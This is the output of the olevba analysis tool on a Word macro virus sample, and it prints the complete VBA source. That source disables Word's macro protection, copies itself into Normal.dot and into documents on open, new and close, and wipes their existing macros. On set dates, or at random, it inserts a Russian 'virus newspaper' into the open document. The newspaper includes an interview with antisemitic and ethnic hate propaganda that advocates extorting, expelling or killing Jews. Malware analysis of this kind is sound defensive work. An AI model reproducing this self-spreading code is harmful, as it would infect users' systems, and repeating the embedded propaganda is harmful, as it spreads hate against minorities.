olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zeitung-e5399fc80c9f9f79245c602eab180cad6ef09dff
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zeitung-e5399fc80c9f9f79245c602eab180cad6ef09dff - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const E_Marker = "VirusZeitung" 'сигнатура вируса
'иу одл:АкдйФнрвкй лкад фео  иалШтлв@Врссзаи раи иаеси,АеснрЕрмвиМхи аао
'1
'номер 1 за 2000 год
Dim ad, nt As Object
Dim sd, snt As Boolean
 
Private Function NormalKontam()
 If Not nt.codemodule.Find(E_Marker, 1, 1, 10000, 10000) Then
  NormalKontam = 0
 Else
  If nt.codemodule.countoflines < 3 Then
   NormalKontam = 0
  Else
   ant$ = Trim(nt.codemodule.lines(3, nt.codemodule.countoflines))
   ant$ = Mid(ant$, 2, Len(ant$) - 1)
   If Val(Trim(ant$)) < 65535 Then
    NormalKontam = Val(Trim(ant$))
   Else
    NormalKontam = -1
   End If
  End If
 End If
End Function

Private Function ADokumKontam()
 If Not ad.codemodule.Find(E_Marker, 1, 1, 10000, 10000) Then
  ADokumKontam = 0
 Else
  If ad.codemodule.countoflines < 3 Then
   ADokumKontam = 0
  Else
   ant$ = Trim(ad.codemodule.lines(3, ad.codemodule.countoflines))
   ant$ = Mid(ant$, 2, Len(ant$) - 1)
   If Val(Trim(ant$)) < 65535 Then
    ADokumKontam = Val(Trim(ant$))
   Else
    ADokumKontam = -1
   End If
  End If
 End If
End Function

Private Sub VirusArbeit()
 On Error Resume Next
 Options.VirusProtection = False
 Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
 Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
 If (ADokumKontam < NormalKontam) And ((ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate)) Then
  sd = ActiveDocument.Saved
  If ad.codemodule.countoflines > 0 Then
   Open "C:\" + ActiveDocument.ActiveWindow.Caption + ".TXT" For Append As #1
   Print #1, "Макросы, бывшие в документе до внедрения вируса"
   For v = 1 To ad.codumodule.countoflines
    Print #1, ad.codemodule.lines(v, 1)
   Next v
   Close #1
   ad.codemodule.deletelines 1, ad.codemodule.countoflines
  End If
  For v = 1 To nt.codemodule.countoflines
   ad.codemodule.insertlines v, nt.codemodule.lines(v, 1)
  Next v
  If (sd = True) And (Mid(ActiveDocument.ActiveWindow.Caption, 1, 8) <> "Документ") Then ActiveDocument.Save
 End If
 
 If ADokumKontam > NormalKontam Then
  snt = NormalTemplate.Saved
  If nt.codemodule.countoflines > 0 Then
   Open "C:\NORMAL.TXT" For Append As #1
   Print #1, "Макросы, бывшие в шаблоне Normal.dot"
   For v = 1 To nt.codemodule.countoflines
    Print #1, nt.codemodule.lines(v, 1)
   Next v
   Close #1
   nt.codemodule.deletelines 1, nt.codemodule.countoflines
  End If
  For v = 1 To ad.codemodule.countoflines
   nt.codemodule.insertlines v, ad.codemodule.lines(v, 1)
  Next v
  If snt = True Then NormalTemplate.Save
 End If
 Set nt = Nothing
 Set ad = Nothing
End Sub

Private Sub HauptArbeit(p)
 Tag$ = ""
 Monat$ = ""
 datum$ = Trim(Date)
 i = 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Tag$ = Tag$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 i = i + 1
 While (Mid(datum$, i, 1) <> ".") And (i < Len(datum$))
  Monat$ = Monat$ + Mid(datum$, i, 1)
  i = i + 1
 Wend
 
 If (Val(Monat$) = 2) And (Val(Tag$) = 2) Then
  p = 2
 End If
 If (Val(Monat$) = 3) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 4) And (Val(Tag$) = 30) Then
  p = 2
 End If
 If (Val(Monat$) = 6) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 8) And (Val(Tag$) = 2) Then
  p = 2
 End If
 If (Val(Monat$) = 9) And (Val(Tag$) = 21) Then
  p = 2
 End If
 If (Val(Monat$) = 10) And (Val(Tag$) = 31) Then
  p = 2
 End If
 If (Val(Monat$) = 12) And (Val(Tag$) = 21) Then
  p = 2
 End If
  
 If Rnd >= p Then
  Exit Sub
 End If
 Z_Kopf
 
 Druck_0 Artikel_1$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_1$(2, ab_) <> ""
  Druck_0 Artikel_1$(2, ab_), 14, False, wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_1$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Druck_0 Artikel_2$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_2$(2, ab_) <> ""
  Druck_0 Artikel_2$(2, ab_), 14, False, wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_2$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Druck_0 Artikel_3$(1, 0), 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 ab_ = 0
 While Artikel_3$(2, ab_) <> ""
  Druck_0 Artikel_3$(2, ab_), 14, ab_ / 2 <> Int(ab_ / 2), wdAlignParagraphJustify, 1.5
  ab_ = ab_ + 1
 Wend
 Selection.TypeParagraph
 Druck_0 Artikel_3$(3, 0), 14, True, wdAlignParagraphRight, 0
 Selection.TypeParagraph
 
 Z_Sub
End Sub

Private Sub Document_Close()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Document_New()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Document_Open()
 VirusArbeit
 HauptArbeit (0.1)
End Sub

Private Sub Z_Kopf()
 Druck_0 "А Д С К И Й   О Г О Н Ь", 40, True, wdAlignParagraphCenter, 0
 Druck_0 "Вирусная газета секты им. Дж. Ди и Э. Келли.", 18, False, wdAlignParagraphLeft, 0
 Druck_0 "Выход по мере комплектования номера", 18, False, wdAlignParagraphLeft, 0
 Druck_0 "5  января  2000  г.   № 1 (1)", 18, False, wdAlignParagraphLeft, 0
 Selection.TypeParagraph
 Druck_0 "Сегодня в номере:", 18, True, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_1$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_2$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Druck_0 "* " + Artikel_3$(1, 0), 18, False, wdAlignParagraphLeft, 0
 Selection.TypeParagraph
 Druck_0 "******************************", 18, True, wdAlignParagraphCenter, 0
 Selection.TypeParagraph
 Selection.TypeParagraph
End Sub

Private Sub Z_Sub()
 Selection.TypeParagraph
 Selection.TypeParagraph
 Druck_0 "*************************************", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Учредитель - сатанинская секта имени Джона Ди и Эдварда Келли", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Главный редактор - В. Д. Тараскин", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Директор - Г. С. Лисунов", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Автор идеи - А. Н. Генова", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Консультант по вопросам вирусологии -  П. В. Ногин", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Главный программист - А. В. Рыжов", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Компьютерный набор и оформление - Т. В. Зубова", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Мнение редакции может не совпадать с позицией авторов публикаций.", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "При перепечатке и использовании материалов ссылка на газету необязательна.", 14, False, wdAlignParagraphCenter, 0
 Druck_0 "Редакция не несет ответственности за содержание публикуемых материалов.", 14, False, wdAlignParagraphCenter, 0
End Sub

Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind)
 Selection.Font.Size = Siz
 Selection.Font.Bold = Bld
 Selection.ParagraphFormat.Alignment = Alg
 Selection.ParagraphFormat.FirstLineIndent = CentimetersToPoints(Ind)
 Selection.TypeParagraph
 Selection.TypeText Text:=T
End Sub

Private Function Artikel_1$(T, Ab)
 If T = 1 Then
  Artikel_1$ = "РОЖДЕНИЕ  НОВОГО  ИЗДАНИЯ"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_1$ = "Уважаемые читатели! Вы присутствуете при уникальном событии: рождается не просто новое издание, как следует из заголовка, а принципиально новый тип периодического издания - вирусная газета. В нынешнее время информационные технологии прочно вошли в наш быт; почти каждый человек знает, что такое компьютер, или даже имеет его у себя дома; мы не мыслим своей жизни без Internet'а. Все знают (хотя бы понаслышке) о компьютерных вирусах, и создаваемых ими проблемах. До сих пор бытовало мнение, что компьютерный вирус может приносить только вред, однако мы поставили своей целью опровергнуть данное заявление, найдя вирусу полезное применение."
   Case 1
    Artikel_1$ = "Как известно, во все времена средства массовой информации (здесь и далее - СМИ) играли важную роль в жизни общества. Особым спросом пользуются СМИ, не контролируемые разного рода властными структурами, а также не предъявляющие повышенных требований к своим читателям. К примеру: многие хотят помещать свои объявления анонимно и по возможности бесплатно, публиковать под вымышленным именем или анонимно материалы любого объема и содержания и т.п. Официальные издания делают такое невозможным или крайне затрудняют, чем вызывают законную неприязнь у большинства граждан. Наша газета  не имеет данных недостатков, так как является нелегальной, и как следствие - подпольной. Подпольные газеты существовали и ранее, однако их издание и распространение было связано с большим риском как для читателей, так и для издателей. " & _
    "То же самое можно сказать и о распространении листовок. Эти недостатки могут быть устранены при помощи перевода газеты на новую основу, исключающую или сводящую к минимуму контакт читателей с издательством. В качестве такой основы было решено использовать компьютерный вирус, так как он способен распространяться без вмешательства человека везде, где есть восприимчивые к нему компьютеры."
   Case 2
    Artikel_1$ = "Как известно, компьютерные вирусы классифицируются по нескольким признакам, в частности, по степени причиняемого ими вреда. Вирусы, называемые ""безвредными"", только размножаются и занимают память; так называемые ""неопасные"" вирусы в дополнение к  перечисленному производят различные звуковые, графические и прочие эффекты. Остальные разновидности вирусов мы не будем рассматривать, так как они не потребуются для дальнейшего объяснения. До сих пор вирусы, относимые к ""неопасным"", выводили только сообщения, не имеющие в большинстве случаев, никакой практической ценности; однако, не требует доказательств, что такой вирус в принципе может вывести на экран текст газеты или листовки. Стоит только оснастить вирус такой ""начинкой"", и он становится соответственно газетой или листовкой, которая распространяет себя сама. При этом возникает следующая проблема: газета выходит периодически, и ее новые номера должны вытеснять из среды обитания старые. Подобное не является невозможным для " & _
    "компьютерных вирусов: некоторые из них снабжены механизмом обновления версии, что при соответствующей доработке может быть применено для замены старого номера газеты новым. Для реализации такой газеты необходимо выбрать среду обитания вируса. Наиболее целесообразным представляется распространение подпольной газеты при помощи макровируса, так как в настоящее время чаще всего с компьютера на компьютер переносят документы и электронные таблицы, которые являются средой обитания таких вирусов."
   Case 3
    Artikel_1$ = "Наша секта была создана в 1991 году, однако до сих пор не имела своего печатного органа, что является серьезным недостатком. Иногда мы по разным поводам писали в различные газеты, но наши материалы упорно не публиковались, за исключением одного раза. Теперь мы решили данную проблему путем создания собственной вирусной газеты. Не следует думать, однако, что здесь будут печататься только материалы наших сектантов; наоборот, мы стараемся быть открытыми для всех, вне зависимости от вероисповедания, национальности и политических убеждений. Газета выходит по мере комплектования номера. В ближайшем будущем будет опубликован способ связи с нашей редакцией, которым сможет воспользоваться каждый, кто знаком с языком программирования Visual Basic. Для тех, кто не знаком с программированием, в городе имеется сеть корреспондентов."
   Case 4
    Artikel_1$ = "Более подробно о вирусе расскажет ниже наш главный программист Александр Рыжов."
   Case Else
    Artikel_1$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_1$ = "Главный редактор    В. Д. Тараскин"
 End If
End Function

Private Function Artikel_2$(T, Ab)
 If T = 1 Then
  Artikel_2$ = "ГАЗЕТНЫЙ ВИРУС: ЧТО ЭТО ТАКОЕ ?"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_2$ = "Сразу спешу успокоить наших читателей: вирус, распространяющий газету ""Адский огонь"", не имеет никаких встроенных деструктивных функций и не содержит ошибок, затрудняющих размножение или угрожающих разрушением данных."
   Case 1
    Artikel_2$ = "Вирус, который мы условно называем ""Inferno"", представляет собой макровирус, поражающий документы в формате Microsoft Word. Он состоит из ряда процедур, которые обеспечивают его размножение, смену старого номера новым, собственно печать материалов, а также автомакросы, запускаемые при открытии, закрытии и создании нового файла. Первая строка содержит сигнатуру вируса, вторая - авторский знак, а третья - строковую запись номера газеты. Во второй строке закодированы имена и фамилии авторов вируса, которые продали нам текст программы и пожелали остаться неизвестными."
   Case 2
    Artikel_2$ = "При открытии зараженного файла отключается проверка документов на предмет наличия макросов, происходит заражение шаблона NORMAL.DOT (если он не заражен, или заражен более ранним номером газеты). Если шаблон уже содержит какие-либо макросы, то они переносятся в текстовый файл NORMAL.TXT. Если файл с таким именем уже существует, то переносимые макросы добавляются к нему."
   Case 3
    Artikel_2$ = "Затем каждый новый файл, основанный на этом шаблоне будет заражаться при создании и при закрытии. Если он уже содержит какие-нибудь макросы, то они также переносятся в текстовый файл (*.TXT), имя которого совпадает с именем файла документа."
   Case 4
    Artikel_2$ = "В зависимости от случайного счетчика (в определенные дни обязательно) в редактируемый документ вставляется текст газеты."
   Case Else
    Artikel_2$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_2$ = "Главный программист секты   А. В. Рыжов"
 End If
End Function

Private Function Artikel_3$(T, Ab)
 If T = 1 Then
  Artikel_3$ = "ГДЕ  ЖЕ  ВЫ,  РУССКИЕ  ?"
 End If
 If T = 2 Then
  Select Case Ab
   Case 0
    Artikel_3$ = "Первый материал, опубликованный в нашей газете, посвящен национальному вопросу. Наш корреспондент М. В. Чурилов беседует с главой астраханского филиала ""Русского национального единства""."
   Case 1
    Artikel_3$ = "- Назовите, пожалуйста себя."
   Case 2
    Artikel_3$ = "- Ввиду опасности моей работы я не могу назвать свое настоящее имя; у меня есть псевдоним, который я вам сообщу: Сапугин Евгений Анатольевич. Так меня и зовите."
   Case 3
    Artikel_3$ = "- Имя и отчество настоящие ?"
   Case 4
    Artikel_3$ = "- Об этом догадывайтесь сами."
   Case 5
    Artikel_3$ = "- Что вы подразумеваете под ""работой"", которая сопряжена с такой опасностью ?"
   Case 6
    Artikel_3$ = "- Главная цель нашей организации состоит в том, чтобы очистить Россию от разного рода этнического мусора, который заглушает все исконно русское, и не дает стране нормально жить. Этот мусор не хочет быть выметенным, и пытается разделаться с нами, в связи  с чем представляет большую опасность. Если вы внимательно приглянетесь к теперешней ситуации, то не можете не заметить, что почти на каждом ключевом посту, имеющем хоть какое-то значение, сидит какой-нибудь инородец (чаще всего - еврей) и вьет веревки из настоящих русских. Не забывайте, что мы - государствообразующая нация, и должны защищаться от такой падали всеми доступными и недоступными средствами."
   Case 7
    Artikel_3$ = "- Какие средства Вы имеете в виду?"
   Case 8
    Artikel_3$ = "- В начале нам придется действовать нелегальными методами. Инородцы сидят везде и пытаются всеми средствами оттеснить нас от рычагов управления; наглядным примером того является запрещение партии ""Русское национальное единство"" и отмена регистрации движения ""Спас"". За это они должны понести и понесут суровое наказание, но сначала из них необходимо выжать все, что может пойти на пользу России, то есть деньги, имущество, знания, опыт и многое другое. Поскольку они не отдадут ничего добровольно, нам придется взять это силой. Все богатые евреи и прочие инородцы должны быть в начале обложены налогом на право жить в России или привлекаться к разного рода принудительным видам деятельности. За отказ от уплаты должна следовать расправа над должником или его родными."
   Case 9
    Artikel_3$ = "- Правильно ли я понял, что Вы предлагаете обычный рэкет всех состоятельных инородцев ?"
   Case 10
    Artikel_3$ = "- Да, некоторые называют это таким образом."
   Case 11
    Artikel_3$ = "- А как вы относитесь к русским, состоящим в смешанных браках?"
   Case 12
    Artikel_3$ = "- Я считаю таких людей предателями своей нации, которые засоряют генофонд русского народа разным дерьмом; они должны облагаться наравне с вышеупомянутыми категориями граждан. Рожденные в таких браках дети-полукровки подлежат тому же обложению."
   Case 13
    Artikel_3$ = "- Как понимать слово ""полукровки"" ?  Не пытаетесь ли Вы ввести культ ""чистоты крови"", воспетый когда-то Гитлером и его подручными?"
   Case 14
    Artikel_3$ = "- ""Чистота крови"" есть наша программа-максимум, однако до нее нам еще очень далеко. Дело в том, что наш генофонд сильно засорен, и его очистка потребует немалого времени; сейчас мы должны остановить, насколько это возможно, процесс его дальнейшего засорения. Особенно опасны в этом отношении евреи: этот народ долгое время подвергал себя инбридингу, в результате чего накопил громадное количество опасных, вплоть до летальных генов. Они в первую очередь должны быть высланы за пределы России или ликвидированы. Что же касается Гитлера, то культ ""чистоты крови"" и геноцид евреев придумали задолго до него; он только усовершенствовал это."
   Case 15
    Artikel_3$ = "- Какие конкретные действия вы предпринимаете в данном направлении ?"
   Case 16
    Artikel_3$ = "- Мы отобрали наиболее чистокровных людей среди своих членов, и пытаемся возродить свой исконный генофонд, насколько это допускает возможность. Деньги, необходимые для нашей деятельности, будем выколачивать из состоятельных евреев, татар и прочих выродков, по недоразумения оказавшихся в этой стране."
   Case 17
    Artikel_3$ = "- Вам не кажется, что в Астрахани такая задача может оказаться чрезвычайно трудной, ведь процент русских  здесь весьма невелик ?"
   Case 18
    Artikel_3$ = "- Мы в этом уверены, но к трудностям привыкли, и считаем задачу вполне разрешимой. Как говорится в поговорке: ""дорогу осилит идущий""."
   Case 19
    Artikel_3$ = "- Желаю Вам успеха. Всего хорошего !"
   Case 20
    Artikel_3$ = "- До свидания."
   Case Else
    Artikel_3$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_3$ = "Беседу проводил наш корреспондент  М. В. Чурилов"
 End If
End Function






































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

